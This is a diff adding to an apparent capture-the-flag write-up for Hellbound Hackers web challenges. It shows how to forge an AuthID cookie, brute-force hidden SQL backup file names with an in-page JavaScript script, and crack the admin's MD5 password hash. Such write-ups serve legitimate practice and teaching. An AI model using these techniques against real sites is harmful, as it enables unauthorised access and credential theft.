@@ -44,3 +44,40 @@ AuthID: 4601420
 ```
 
 Simply switch your AuthID cookie to that value, and you will now be able to edit the price. 
+
+###Realistic 2
+We find that upon entering the /backups/ directory, we are blocked from getting a directory listing. Luckily the challenge text gives us a hint that massively reduces the amount of possibilities:
+```
+September of 2004. It looks like backup_2004-09-01_1000.sql
+```
+
+So our backup file is going to be in the format:
+```
+backup_2004-09-xx_yy00.sql
+```
+
+With only 30 days in September and 24 hours in a day, that leaves us with only 720 combinations to brute-force. We will execute a script against the page to check the urls for us (we have to be on the page due to same-origin policy existing on the XMLHttpRequest) object.
+```
+function checkURL( url ) {
+	var request = new XMLHttpRequest();  
+	request.open('GET', url, true);
+	request.onreadystatechange = function(){
+	    if (request.readyState == 4){
+	        if (request.status != 404) {  
+	            console.log( url );
+	        }  
+	    }
+	};
+	request.send();
+}
+
+for( var day = 1; day <= 30; day++ ) {
+	for( var hour = 0; hour <= 24; hour++ ) {
+		var url_to_check = 'https://www.hellboundhackers.org/challenges/real2/backups/backup_2004-09-' + ( day < 10 ? '0' + day : day ) + '_' + ( hour < 10 ? '0' + hour : hour ) + '00.sql';
+
+		checkURL( url_to_check );
+	}
+}
+```
+
+Executing this script will result in a valid url being outputed; simply download that sql file and open it up to reveal a username : md5. Decrypt the md5 hash to get your admin password.
